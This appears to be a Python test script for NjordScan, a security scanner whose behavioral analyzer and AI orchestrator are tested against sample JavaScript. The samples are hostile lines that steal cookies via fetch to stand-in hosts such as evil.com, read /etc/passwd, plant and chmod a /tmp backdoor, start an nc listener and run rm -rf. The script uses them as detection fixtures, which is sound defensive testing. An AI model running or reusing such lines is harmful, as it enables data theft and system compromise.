#!/usr/bin/env python3
"""
Test script for enhanced behavioral analysis system.
"""

import asyncio
import sys
import os
from pathlib import Path

# Add the project root to the Python path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from njordscan.intelligence.behavioral_analyzer import (
    BehavioralAnalyzer, BehavioralAnalysisConfig, BehaviorType, AnomalyType
)
from njordscan.intelligence.intelligence_orchestrator import IntelligenceOrchestrator
from njordscan.ai.ai_orchestrator import AISecurityOrchestrator

async def test_enhanced_anomaly_detection():
    """Test enhanced anomaly detection capabilities."""
    print("🔍 Testing Enhanced Anomaly Detection...")
    
    # Create test configuration
    config = BehavioralAnalysisConfig(
        enable_function_analysis=True,
        enable_file_analysis=True,
        enable_temporal_analysis=True,
        anomaly_threshold=0.7
    )
    
    # Initialize analyzer
    analyzer = BehavioralAnalyzer(config)
    
    # Test code with various suspicious patterns
    test_code = """
    // Test code with multiple suspicious patterns
    function maliciousBehavior() {
        // Code injection risk
        eval(userInput);
        exec(userCommand);
        
        // Timing-based behavior
        setTimeout(() => {
            setInterval(() => {
                // File system access
                fs.readFileSync('/etc/passwd');
                fs.writeFileSync('/tmp/backdoor.js', maliciousCode);
                
                // Network requests
                fetch('http://malicious-site.com/steal?data=' + document.cookie);
                XMLHttpRequest.open('POST', 'http://evil.com/exfiltrate');
                
                // Process execution
                child_process.exec('chmod +x /tmp/backdoor.js');
                child_process.spawn('nc', ['-l', '4444']);
            }, 1000);
        }, 5000);
        
        // Multiple calls to same function (frequency anomaly)
        suspiciousFunction();
        suspiciousFunction();
        suspiciousFunction();
        suspiciousFunction();
        suspiciousFunction();
        suspiciousFunction();
    }
    """
    
    try:
        # Analyze the code
        results = await analyzer.analyze_code_behavior("malicious.js", test_code)
        
        print(f"  ✅ Analysis completed")
        print(f"  ✅ Events detected: {len(results.get('events', []))}")
        print(f"  ✅ Sequences created: {len(results.get('sequences', []))}")
        print(f"  ✅ Anomalies found: {len(results.get('anomalies', []))}")
        print(f"  ✅ Signature matches: {len(results.get('signature_matches', []))}")
        
        # Check for enhanced anomaly detection
        anomalies = results.get('anomalies', [])
        if anomalies:
            print(f"  ✅ Enhanced anomalies detected:")
            for anomaly in anomalies:
                print(f"    - {anomaly.get('anomaly_type', 'unknown')}: {anomaly.get('description', 'N/A')}")
                print(f"      Severity: {anomaly.get('severity', 'unknown')}, Confidence: {anomaly.get('confidence', 0):.2f}")
        
        # Check for enhanced sequence creation
        sequences = results.get('sequences', [])
        if sequences:
            print(f"  ✅ Enhanced sequences created:")
            for sequence in sequences:
                print(f"    - {sequence.get('sequence_id', 'unknown')}: {len(sequence.get('events', []))} events")
        
        return len(anomalies) > 0 and len(sequences) > 0
        
    except Exception as e:
        print(f"  ❌ Enhanced anomaly detection failed: {e}")
        return False

async def test_enhanced_sequence_analysis():
    """Test enhanced sequence analysis capabilities."""
    print("\n🔗 Testing Enhanced Sequence Analysis...")
    
    config = BehavioralAnalysisConfig(
        enable_sequence_anomalies=True,
        minimum_sequence_length=2
    )
    
    analyzer = BehavioralAnalyzer(config)
    
    # Test code with complex behavioral patterns
    test_code = """
    // Complex behavioral sequence
    function complexAttack() {
        // Function call chain
        const data = getSensitiveData();
        const processed = processData(data);
        const encrypted = encryptData(processed);
        const transmitted = transmitData(encrypted);
        
        // Temporal sequence
        setTimeout(() => {
            setInterval(() => {
                // Suspicious pattern sequence
                eval(userInput);
                fs.readFileSync('/etc/passwd');
                fetch('http://evil.com/steal');
            }, 1000);
        }, 5000);
        
        // Another temporal sequence
        setTimeout(() => {
            child_process.exec('rm -rf /tmp/*');
        }, 10000);
    }
    """
    
    try:
        results = await analyzer.analyze_code_behavior("complex.js", test_code)
        
        sequences = results.get('sequences', [])
        print(f"  ✅ Enhanced sequence analysis completed")
        print(f"  ✅ Total sequences created: {len(sequences)}")
        
        # Check for different sequence types
        sequence_types = {}
        for sequence in sequences:
            seq_id = sequence.get('sequence_id', '')
            if seq_id.startswith('loc_seq_'):
                sequence_types['location_based'] = sequence_types.get('location_based', 0) + 1
            elif seq_id.startswith('chain_seq_'):
                sequence_types['function_chain'] = sequence_types.get('function_chain', 0) + 1
            elif seq_id.startswith('temp_seq_'):
                sequence_types['temporal'] = sequence_types.get('temporal', 0) + 1
            elif seq_id.startswith('susp_seq_'):
                sequence_types['suspicious_pattern'] = sequence_types.get('suspicious_pattern', 0) + 1
        
        print(f"  ✅ Sequence types detected:")
        for seq_type, count in sequence_types.items():
            print(f"    - {seq_type}: {count} sequences")
        
        return len(sequences) > 0
        
    except Exception as e:
        print(f"  ❌ Enhanced sequence analysis failed: {e}")
        return False

async def test_ai_orchestrator_fixes():
    """Test AI orchestrator integration fixes."""
    print("\n🤖 Testing AI Orchestrator Integration Fixes...")
    
    try:
        # Initialize AI orchestrator
        ai_orchestrator = AISecurityOrchestrator()
        
        # Test data with behavioral patterns
        test_data = {
            'code_content': """
            // AI-detected behavioral patterns
            function aiTestBehavior() {
                // Suspicious timing patterns
                setInterval(() => {
                    // Data exfiltration pattern
                    fetch('http://suspicious-domain.com/steal?data=' + document.cookie);
                }, 30000);
                
                // File system manipulation
                fs.writeFileSync('/tmp/backdoor.js', maliciousCode);
                
                // Process manipulation
                child_process.exec('chmod +x /tmp/backdoor.js');
            }
            """,
            'api_calls': ['fetch', 'fs.writeFileSync', 'child_process.exec'],
            'execution_times': [0.1, 0.2, 0.15, 0.3, 0.1],
            'memory_usage': 1024,
            'cpu_usage': 0.8
        }
        
        # Perform AI analysis
        result = await ai_orchestrator.perform_comprehensive_analysis("ai_test.js", test_data)
        
        print(f"  ✅ AI analysis completed successfully")
        print(f"  ✅ Analysis ID: {result.analysis_id}")
        print(f"  ✅ Overall security score: {result.overall_security_score:.1f}/100")
        print(f"  ✅ Risk level: {result.risk_level}")
        print(f"  ✅ Confidence: {result.confidence:.2f}")
        print(f"  ✅ Anomalies detected: {len(result.anomalies)}")
        
        # Check anomaly details
        if result.anomalies:
            print(f"  ✅ Anomaly details:")
            for anomaly in result.anomalies[:3]:
                print(f"    - {anomaly.anomaly_type.value}: {anomaly.description}")
                print(f"      Severity: {anomaly.severity.value}, Confidence: {anomaly.confidence:.2f}")
        
        # Check key findings
        if result.key_findings:
            print(f"  ✅ Key findings:")
            for finding in result.key_findings[:3]:
                print(f"    - {finding}")
        
        return True
        
    except Exception as e:
        print(f"  ❌ AI orchestrator test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

async def test_error_handling_improvements():
    """Test improved error handling for external API calls."""
    print("\n🛡️ Testing Error Handling Improvements...")
    
    try:
        # Initialize intelligence orchestrator (this will test API error handling)
        orchestrator = IntelligenceOrchestrator()
        await orchestrator.initialize()
        
        # Test code analysis (should handle API errors gracefully)
        test_code = """
        function testErrorHandling() {
            // Simple test code
            const data = "test";
            console.log(data);
        }
        """
        
        # Perform analysis (should not crash due to API errors)
        report = await orchestrator.analyze_security_intelligence("test.js", test_code)
        
        print(f"  ✅ Error handling test completed")
        print(f"  ✅ Analysis completed despite potential API errors")
        print(f"  ✅ Total findings: {report.total_findings}")
        print(f"  ✅ Threat level: {report.threat_level.value}")
        
        await orchestrator.shutdown()
        return True
        
    except Exception as e:
        print(f"  ❌ Error handling test failed: {e}")
        return False

async def main():
    """Run all enhanced behavioral analysis tests."""
    print("🛡️ NjordScan Enhanced Behavioral Analysis Testing")
    print("=" * 70)
    
    test_results = []
    
    try:
        # Test 1: Enhanced anomaly detection
        result1 = await test_enhanced_anomaly_detection()
        test_results.append(("Enhanced Anomaly Detection", result1))
        
        # Test 2: Enhanced sequence analysis
        result2 = await test_enhanced_sequence_analysis()
        test_results.append(("Enhanced Sequence Analysis", result2))
        
        # Test 3: AI orchestrator fixes
        result3 = await test_ai_orchestrator_fixes()
        test_results.append(("AI Orchestrator Integration Fixes", result3))
        
        # Test 4: Error handling improvements
        result4 = await test_error_handling_improvements()
        test_results.append(("Error Handling Improvements", result4))
        
        # Summary
        print("\n" + "=" * 70)
        print("📋 Enhanced Behavioral Analysis Test Results:")
        
        passed = 0
        total = len(test_results)
        
        for test_name, result in test_results:
            status = "✅ PASSED" if result else "❌ FAILED"
            print(f"  {status} {test_name}")
            if result:
                passed += 1
        
        print(f"\n🎯 Overall Result: {passed}/{total} tests passed")
        
        if passed == total:
            print("🎉 All enhanced behavioral analysis tests passed!")
            print("✅ Behavioral analysis system is fully enhanced and working correctly")
        else:
            print("⚠️ Some enhanced behavioral analysis tests failed")
            print("🔧 Review the failed tests above")
        
        return passed == total
        
    except Exception as e:
        print(f"\n❌ Enhanced behavioral analysis testing failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    asyncio.run(main())
